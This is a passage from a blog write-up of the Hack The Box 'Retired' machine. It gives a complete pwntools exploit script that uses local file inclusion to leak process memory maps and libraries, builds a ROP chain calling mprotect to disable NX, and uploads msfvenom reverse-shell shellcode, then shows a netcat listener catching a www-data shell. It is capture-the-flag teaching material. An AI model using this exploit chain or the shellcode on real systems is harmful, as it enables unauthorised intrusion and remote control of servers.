</span></span><span style=display:flex><span>MPROTECT<span style=color:#f92672>(</span>2<span style=color:#f92672>)</span>                                          Linux Programmer<span style=color:#e6db74>&#39;s Manual                                         MPROTECT(2)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>NAME
</span></span></span><span style=display:flex><span><span style=color:#e6db74>       mprotect, pkey_mprotect - set protection on a region of memory
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SYNOPSIS
</span></span></span><span style=display:flex><span><span style=color:#e6db74>       #include &lt;sys/mman.h&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>       int mprotect(void *addr, size_t len, int prot);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>       #define _GNU_SOURCE             /* See feature_test_macros(7) */
</span></span></span><span style=display:flex><span><span style=color:#e6db74>       #include &lt;sys/mman.h&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>       int pkey_mprotect(void *addr, size_t len, int prot, int pkey);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>DESCRIPTION
</span></span></span><span style=display:flex><span><span style=color:#e6db74>       mprotect()  changes  the access protections for the calling process&#39;</span>s memory pages containing any part of the address range
</span></span><span style=display:flex><span>       in the interval <span style=color:#f92672>[</span>addr, addr+len-1<span style=color:#f92672>]</span>.  addr must be aligned to a page boundary.
</span></span></code></pre></div><h6 id=prepare-our-gadets>Prepare our gadets:</h6><p>A ROP chain, short for &ldquo;return-oriented programming chain&rdquo;, is a sequence of gadget instructions that are strung together to form a malicious program. A gadget is a short sequence of instructions that ends with a return instruction, and is often found in compiled code. By chaining gadgets together, an attacker can construct a program that executes arbitrary code, even in environments where traditional forms of injection (such as buffer overflows) are prevented. This technique is often used in attacks that exploit vulnerabilities in software. (ChatGPT)</p><p>ROP chain: build your own program inside another program, using assembly instructions (gadgets)<br>(Hassan Al Achek :p)</p><ul><li>You can use <code>ropper</code> to get <code>mprotect</code> gadget.</li><li>Or use <code>pwntools</code> a python library for binary exploitaion (i will use pwntools)</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># Note: a friend helped me to build this code</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys<span style=color:#f92672>,</span>re<span style=color:#f92672>,</span>requests<span style=color:#f92672>,</span>socket
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>IP<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;10.10.11.154&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>usage</span>():
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Usage: </span><span style=color:#e6db74>{</span>sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>0</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74> &lt;LOCAL IP&gt; &lt;LOCAL PORT&gt;&#34;</span>)
</span></span><span style=display:flex><span>    exit()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># download file and save to /tmp</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_file</span>(path):
</span></span><span style=display:flex><span>    r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;http://</span><span style=color:#e6db74>{</span>IP<span style=color:#e6db74>}</span><span style=color:#e6db74>/index.php?page=</span><span style=color:#e6db74>{</span>path<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>, allow_redirects<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>    localPath <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;/tmp/</span><span style=color:#e6db74>{</span>path<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;/&#39;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> open(localPath,<span style=color:#e6db74>&#34;wb&#34;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>        f<span style=color:#f92672>.</span>write(r<span style=color:#f92672>.</span>content)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> localPath
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># find process id</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_pid</span>():
</span></span><span style=display:flex><span>    r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;http://</span><span style=color:#e6db74>{</span>IP<span style=color:#e6db74>}</span><span style=color:#e6db74>/index.php?page=/proc/sched_debug&#34;</span>, allow_redirects<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>    pid <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>&#34;activate_licens\s+([0-9]+)&#34;</span>,r<span style=color:#f92672>.</span>text)<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[+] activate_license running @ PID </span><span style=color:#e6db74>{</span>pid<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> pid
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># extract base addresses from /proc/PID/maps</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_addresses</span>(pid):
</span></span><span style=display:flex><span>    r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;http://</span><span style=color:#e6db74>{</span>IP<span style=color:#e6db74>}</span><span style=color:#e6db74>/index.php?page=/proc/</span><span style=color:#e6db74>{</span>pid<span style=color:#e6db74>}</span><span style=color:#e6db74>/maps&#34;</span>, allow_redirects<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>    libc_base <span style=color:#f92672>=</span> int(re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>&#34;^.*libc.*$&#34;</span>, r<span style=color:#f92672>.</span>text, re<span style=color:#f92672>.</span>M)<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>0</span>)<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;-&#34;</span>)[<span style=color:#ae81ff>0</span>], <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>    libc_path <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>&#34;^.*libc.*$&#34;</span>, r<span style=color:#f92672>.</span>text, re<span style=color:#f92672>.</span>M)<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>0</span>)<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34; &#34;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]
</span></span><span style=display:flex><span>    libsqlite_base <span style=color:#f92672>=</span> int(re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>&#34;^.*libsqlite.*$&#34;</span>, r<span style=color:#f92672>.</span>text, re<span style=color:#f92672>.</span>M)<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>0</span>)<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;-&#34;</span>)[<span style=color:#ae81ff>0</span>], <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>    libsqlite_path <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>&#34;^.*libsqlite.*$&#34;</span>, r<span style=color:#f92672>.</span>text, re<span style=color:#f92672>.</span>M)<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>0</span>)<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34; &#34;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]
</span></span><span style=display:flex><span>    stack_base <span style=color:#f92672>=</span> int(re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>&#34;^.*\[stack\].*$&#34;</span>, r<span style=color:#f92672>.</span>text, re<span style=color:#f92672>.</span>M)<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>0</span>)<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;-&#34;</span>)[<span style=color:#ae81ff>0</span>], <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>    stack_end <span style=color:#f92672>=</span> int(re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>&#34;^.*\[stack\].*$&#34;</span>, r<span style=color:#f92672>.</span>text, re<span style=color:#f92672>.</span>M)<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>0</span>)<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;-&#34;</span>)[<span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>split()[<span style=color:#ae81ff>0</span>], <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> libc_base, libc_path,libsqlite_base, libsqlite_path, stack_base, stack_end
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> len(sys<span style=color:#f92672>.</span>argv) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>3</span>:
</span></span><span style=display:flex><span>        usage()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        ip <span style=color:#f92672>=</span> socket<span style=color:#f92672>.</span>inet_aton(sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>])
</span></span><span style=display:flex><span>        port <span style=color:#f92672>=</span> struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#34;&gt;H&#34;</span>,int(sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>2</span>]))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span>:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[-] Invalid arguments&#34;</span>)
</span></span><span style=display:flex><span>        usage()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Shellcode     msfvenom -p linux/x64/shell_reverse_tcp LHOST=ip LPORT=port -f py</span>
</span></span><span style=display:flex><span>    shellcode <span style=color:#f92672>=</span>  <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>    shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x97\x48\xb9\x02\x00</span><span style=color:#e6db74>&#34;</span>   <span style=color:#f92672>+</span> port  <span style=color:#f92672>+</span>  ip <span style=color:#f92672>+</span>   <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x51\x48</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># search PID with LFI</span>
</span></span><span style=display:flex><span>    pid <span style=color:#f92672>=</span> get_pid()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> pid:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[-] Could not find PID for activate_license&#34;</span>)
</span></span><span style=display:flex><span>        exit()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># search addresses in /proc/PID/maps</span>
</span></span><span style=display:flex><span>    libc_base, libc_path, libsqlite_base, libsqlite_path, stack_base, stack_end <span style=color:#f92672>=</span> get_addresses(pid)
</span></span><span style=display:flex><span>    <span style=color:#75715e># calc sizeof(stack) for mprotect</span>
</span></span><span style=display:flex><span>    stack_size <span style=color:#f92672>=</span> stack_end <span style=color:#f92672>-</span> stack_base     <span style=color:#75715e># 0x21000</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    context<span style=color:#f92672>.</span>clear(arch<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;amd64&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#75715e># we need the same libraries versions used on the remote machine</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># to obtain a succesful result. So we downloaded the needed libraries</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># from the remote machine</span>
</span></span><span style=display:flex><span>    libc <span style=color:#f92672>=</span> ELF(get_file(libc_path),checksec<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)              <span style=color:#75715e># download libc</span>
</span></span><span style=display:flex><span>    libc<span style=color:#f92672>.</span>address <span style=color:#f92672>=</span> libc_base
</span></span><span style=display:flex><span>    libsql <span style=color:#f92672>=</span> ELF(get_file(libsqlite_path),checksec<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)       <span style=color:#75715e># download libsqlite</span>
</span></span><span style=display:flex><span>    libsql<span style=color:#f92672>.</span>address <span style=color:#f92672>=</span> libsqlite_base
</span></span><span style=display:flex><span>    rop <span style=color:#f92672>=</span> ROP([libc, libsql])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    offset <span style=color:#f92672>=</span> <span style=color:#ae81ff>520</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># search ROP Gadgets</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># we will use thes gadgets in order to push the arguments needed</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># by mprotect function and we need to respect the x64 assembly calling convention</span>
</span></span><span style=display:flex><span>    mprotect <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;mprotect&#39;</span>]     <span style=color:#75715e># 0xf8c20           readelf -s libc.so.6 | grep mprotect</span>
</span></span><span style=display:flex><span>    pop_rdi <span style=color:#f92672>=</span> rop<span style=color:#f92672>.</span>rdi[<span style=color:#ae81ff>0</span>]                    <span style=color:#75715e># 0x26796           ropper -f libc.so.6 --search &#34;pop rdi&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    pop_rsi <span style=color:#f92672>=</span> rop<span style=color:#f92672>.</span>rsi[<span style=color:#ae81ff>0</span>]                    <span style=color:#75715e># 0x2890f           ropper -f libc.so.6 --search &#34;pop rsi&#34;</span>
</span></span><span style=display:flex><span>    pop_rdx <span style=color:#f92672>=</span> rop<span style=color:#f92672>.</span>rdx[<span style=color:#ae81ff>0</span>]                    <span style=color:#75715e># 0xcb1cd           ropper -f libc.so.6 --search &#34;pop rdx&#34;</span>
</span></span><span style=display:flex><span>    jmp_rsp <span style=color:#f92672>=</span> rop<span style=color:#f92672>.</span>jmp_rsp[<span style=color:#ae81ff>0</span>]                <span style=color:#75715e># 0xd431d           ropper -f libsqlite3.so.0.8.6 --search &#34;jmp rsp&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span> <span style=color:#f92672>*</span> offset
</span></span><span style=display:flex><span>    <span style=color:#75715e>#disable the NX protection</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>#int mprotect(void *addr, size_t len, int prot);</span>
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>+=</span> p64(pop_rdi) <span style=color:#f92672>+</span> p64(stack_base)       <span style=color:#75715e># addr = Begin of Stack</span>
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>+=</span> p64(pop_rsi) <span style=color:#f92672>+</span> p64(stack_size)       <span style=color:#75715e># len = size of Stack</span>
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>+=</span> p64(pop_rdx) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>7</span>)                <span style=color:#75715e># prot = Permission 7 -&gt; rwx</span>
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>+=</span> p64(mprotect)                        <span style=color:#75715e># call mprotect</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>+=</span> p64(jmp_rsp)                         <span style=color:#75715e># jmp rsp</span>
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>+=</span> shellcode                            <span style=color:#75715e># add shellcode</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># File Upload beta.html</span>
</span></span><span style=display:flex><span>    r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;http://</span><span style=color:#e6db74>{</span>IP<span style=color:#e6db74>}</span><span style=color:#e6db74>/activate_license.php&#34;</span>, files <span style=color:#f92672>=</span> { <span style=color:#e6db74>&#34;licensefile&#34;</span>: payload } )
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    main()
</span></span></code></pre></div><ul><li>References to go further:<ul><li><a href=https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame>x64 assembly calling convention</a></li><li><a href=https://beta.hackndo.com/return-oriented-programming/>ROP chains - French</a></li><li><a href=https://ctf101.org/binary-exploitation/return-oriented-programming/>ROP chains - English - CTF101</a></li><li><a href=https://valsamaras.medium.com/introduction-to-x64-linux-binary-exploitation-part-3-rop-chains-3cdcf17e8826>Disable NX protection with mprotect by +Ch0pin</a></li></ul></li></ul><h4 id=run-the-exploit-shell-as-www-data>Run The Exploit: Shell As WWW-DATA</h4><ul><li>Start the exploitation code:</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Terminal-1</span>
</span></span><span style=display:flex><span>~
</span></span><span style=display:flex><span>❯ ./exploit.py 10.10.16.6 <span style=color:#ae81ff>9999</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> activate_license running @ PID <span style=color:#ae81ff>401</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Loaded <span style=color:#ae81ff>190</span> cached gadgets <span style=color:#66d9ef>for</span> <span style=color:#e6db74>&#39;/tmp/libc-2.31.so&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Loaded <span style=color:#ae81ff>162</span> cached gadgets <span style=color:#66d9ef>for</span> <span style=color:#e6db74>&#39;/tmp/libsqlite3.so.0.8.6&#39;</span>
</span></span></code></pre></div><ul><li>Receive connection from the tcp shell code with netcat:</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Terminal-2</span>
</span></span><span style=display:flex><span>~
</span></span><span style=display:flex><span>❯ nc -lvp <span style=color:#ae81ff>9999</span>
</span></span><span style=display:flex><span>Listening on DESKTOP-I8TJHTD <span style=color:#ae81ff>9999</span>
</span></span><span style=display:flex><span>Connection received on 10.10.11.154 <span style=color:#ae81ff>44496</span>
</span></span><span style=display:flex><span>ls
</span></span><span style=display:flex><span>2022-12-08_20-06-00-html.zip
</span></span><span style=display:flex><span>2022-12-08_20-07-00-html.zip
</span></span><span style=display:flex><span>2022-12-08_20-08-00-html.zip
</span></span><span style=display:flex><span>html
</span></span><span style=display:flex><span>license.sqlite
</span></span><span style=display:flex><span>bash -i
</span></span><span style=display:flex><span>bash: cannot set terminal process group <span style=color:#f92672>(</span>401<span style=color:#f92672>)</span>: Inappropriate ioctl <span style=color:#66d9ef>for</span> device
</span></span><span style=display:flex><span>bash: no job control in this shell
</span></span><span style=display:flex><span>www-data@retired:/var/www$ echo <span style=color:#e6db74>&#34;FootHold&#34;</span>
</span></span></code></pre></div><h2 id=to-be-continued->To be continued &mldr;</h2></article><section id=articleNext class="section nartrow"><h3 class=footer-next-heading>More articles from My Blog</h3><div class=footer-spacer></div><div class=next-articles-grid numberofarticles={numberOfArticles}><div class=post-row><a href=/posts/about/ class=article-link id=article-link-bigger><div><div class=image-container><img src=/images/whoami.webp class=article-image></div><div><h2 class=article-title>About</h2><p class=article-excerpt>Whoami</p><div class=article-metadata>November 24, 2024 · 1 min read</div></div></div></a><a href=/posts/updown-htb-machine/ class=article-link><div><div class=image-container><img src=/images/updown.jpg class=article-image></div><div><h2 class=article-title>UpDown From Hack The Box - Medium Linux Machine</h2><p class=article-excerpt>Gaining access to a development web application's source code through an exposed .git repository, I discovered a time-limited file upload vulnerability through static code analysis. I exploited this vulnerability to gain access as the www-data user. By exploiting a setuid binary and the input() function behavior in Python 2, I was able to locally pivot to the developer user. Finally, I elevated my privileges to root by exploiting the easy_setup utility.</p><div class=article-metadata>January 3, 2023 · 14 min read</div></div></div></a></div></div></section></section><script src=/js/progressBar.js></script><div class=footer-gradient></div><div class="section narrow"><div class=footer-hr></div><div class=footer-container><div class=footer-text>© 2024 My Blog</div><div class=social-icon-outer><div class=social-icon-container></div></div></div></div></div><script src=/js/prism.js></script></body></html>